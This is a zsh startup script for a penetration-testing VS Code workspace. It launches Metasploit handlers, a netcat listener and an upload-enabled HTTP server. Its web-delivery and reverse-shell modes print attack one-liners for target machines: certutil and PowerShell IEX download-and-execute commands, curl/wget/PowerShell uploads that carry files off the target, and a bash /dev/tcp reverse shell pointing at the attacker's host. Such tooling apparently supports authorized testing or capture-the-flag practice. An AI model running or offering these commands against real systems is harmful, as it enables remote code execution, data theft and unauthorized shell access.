# POST executed after the shell is loaded
# This file is loaded after .zshrc

# you can define any functions,settings,automation here.

source ${PROJECT_FOLDER}/.vscode/env.zsh

if [ "$WEB_DELIVERY_MODE" ]; then
    if [ -z "$PROJECT_WEB_DELIVERY" ]; then
        echo "PROJECT_WEB_DELIVERY is not set. Please set it in .vscode/env.zsh"
    else
        if [ -d "$PROJECT_WEB_DELIVERY" ]; then
            echo "FOLDER $PROJECT_WEB_DELIVERY exists."
        else
            mkdir -p $PROJECT_WEB_DELIVERY
            echo "*" >$PROJECT_WEB_DELIVERY/.gitignore
            echo "FOLDER $PROJECT_WEB_DELIVERY created."
        fi
    fi
    cd $PROJECT_WEB_DELIVERY
    export LHOST=${LHOST:-"127.0.0.1"}
    export LISTEN_ON=${LISTEN_ON:-8890}
    echo "=============================================================================================="
    echo "                                        WEB DELIVERY BASIC INFO"
    echo "YOUR IP: $LHOST       YOUR PORT: $LISTEN_ON"
    echo "YOUR URL: http://$LHOST:$LISTEN_ON"
    echo "=============================================================================================="
    echo "                                        TIPS FOR WEB DELIVERY     "
    echo "=============================================================================================="
    echo "                                             DOWNLAODING"
    echo ""
    echo "curl --output filename http://$LHOST:$LISTEN_ON/fname"
    echo "wget http://$LHOST:$LISTEN_ON/fname"
    echo "invoke-webrequest -outfile fname -usebasicparsing -uri http://$LHOST:$LISTEN_ON/fname"
    echo "certutil.exe -urlcache -f http://$LHOST:$LISTEN_ON/fname fname.exe"
    echo "=============================================================================================="
    echo "                                     POWERSHELL MEMORY EXECUTION"
    echo ""
    echo "IEX (New-Object Net.WebClient).DownloadString('http://$LHOST:$LISTEN_ON/fname')"
    echo "=============================================================================================="
    echo "                                            UPLOADING"
    echo "PS: enable this need pdteam/simplehttpserver with -upload"
    echo "    and following will put file in uploadfile"
    echo ""
    echo "curl http://$LHOST:$LISTEN_ON/uploadfile --upload-file filename"
    echo "curl http://$LHOST:$LISTEN_ON/uploadfile -T filename"
    echo "wget --output-document - --method=PUT http://$LHOST:$LISTEN_ON/uploadfile --body-file=filename"
    echo "invoke-webrequest -Uri http://$LHOST:$LISTEN_ON/uploadfile -Method PUT -InFile filename"
    echo "=============================================================================================="
    echo "PS: If your terminal can't display this notes properly, you need resize your terminal window."
    echo ""
    # ProjectDiscovery/SimpleHTTPServer
    simplehttpserver -listen 0.0.0.0:$LISTEN_ON -verbose -upload
    # python3 -m http.server $LISTEN_ON
    read
    exit 0
fi

export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg RHOSTS $RHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LHOST $LHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LPORT $LPORT;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg VHOST $DOMAIN;"

if [ "$METASPLOIT_HANDLER_MODE" ]; then
    msfconsole -r "$PROJECT_FOLDER/.vscode/metasploit_handler.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    read
    exit 0
fi

if [ "$METASPLOIT_CONSOLE_MODE" ]; then
    msfconsole -r "$PROJECT_FOLDER/.vscode/msfconsole.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    read
    exit 0
fi

if [ "$REVERSE_SHELL_MODE" ]; then
    echo ""
    echo "YOUR IP: $LHOST"
    echo "YOUR Reverse Shell Port: $LPORT"
    echo "Basic Revershell Command: "
    echo "  /bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
    echo "Advanced: "
    echo "  https://rev.eson.ninja/?ip=${LHOST}&port=${LPORT}"
    echo ""
    rlwrap -I -cAr netcat -lvvp ${LPORT}
    read;
    exit 0
fi

# Start the virtual environment if exists
if [ -d "$PROJECT_FOLDER/venv" ]; then
    if [ -n "${VIRTUAL_ENV}" ]; then
        # sliently deactivate the virtual environment

        # echo "Virtual Environment is already activated."
        # echo "Virtual Environment Home: ${VIRTUAL_ENV}"
        # echo "Trying to deactivate the virtual environment automatically."

        # force deactivate the virtual environment
        if [ -n "${_OLD_VIRTUAL_PATH:-}" ]; then
            PATH="${_OLD_VIRTUAL_PATH:-}"
            export PATH
            unset _OLD_VIRTUAL_PATH
        fi
        if [ -n "${_OLD_VIRTUAL_PYTHONHOME:-}" ]; then
            PYTHONHOME="${_OLD_VIRTUAL_PYTHONHOME:-}"
            export PYTHONHOME
            unset _OLD_VIRTUAL_PYTHONHOME
        fi
        if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ]; then
            hash -r 2>/dev/null
        fi
        if [ -n "${_OLD_VIRTUAL_PS1:-}" ]; then
            PS1="${_OLD_VIRTUAL_PS1:-}"
            export PS1
            unset _OLD_VIRTUAL_PS1
        fi
        unset VIRTUAL_ENV
        unset VIRTUAL_ENV_PROMPT
        if [ ! "${1:-}" = "nondestructive" ]; then
            # deactivate always useless here
            # unset -f deactivate
        fi
    fi

    source $PROJECT_FOLDER/venv/bin/activate
fi

# change hist file location in project.
HISTSIZE=100000000
SAVEHIST=100000000
OLD_HISTFILE=$HISTFILE
if [[ -z "${HISTFILE}" ]]; then
    OLD_HISTFILE=~/.zsh_history
fi
## set new history
HISTFILE=${PROJECT_FOLDER}/.vscode/.command_history
setopt inc_append_history
setopt share_history
setopt hist_save_no_dups
setopt histignorealldups
setopt EXTENDED_HISTORY  # with timestamp
fc -R -I ${OLD_HISTFILE} # loading the old histfile

if [[ "$HIST_COMMAND_INDEXER" != "" ]]; then
    if [[ ! -f ${HIST_COMMAND_INDEXER} ]]; then
        echo "HIST_COMMAND_INDEXER file not found: ${HIST_COMMAND_INDEXER}"
    else
        fc -R -I ${HIST_COMMAND_INDEXER} # loading the command indexer
    fi
fi
